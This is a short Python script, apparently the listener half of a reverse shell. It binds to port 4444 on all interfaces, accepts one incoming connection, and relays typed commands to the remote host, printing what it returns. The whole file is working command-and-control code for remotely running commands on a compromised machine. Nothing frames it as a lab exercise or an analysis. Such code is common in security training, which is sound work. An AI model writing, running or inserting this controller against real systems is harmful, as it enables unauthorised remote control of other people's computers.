import socket
import os
import sys

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'tools')))

server_ip = "0.0.0.0"
server_port = 4444

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((server_ip, server_port))
server_socket.listen()

print(f"[*] Listening on {server_ip}:{server_port}")

client_socket, client_address = server_socket.accept()
print(f"[*] Connection received from {client_address}")

while True:
    command = input("Command>")

    if command.lower() == "exit":
        client_socket.send(command.encode("utf-8"))
        break

    client_socket.send(command.encode("utf-8"))

    output = client_socket.recv(4096).decode("utf-8")
    print(output)

client_socket.close()
server_socket.close()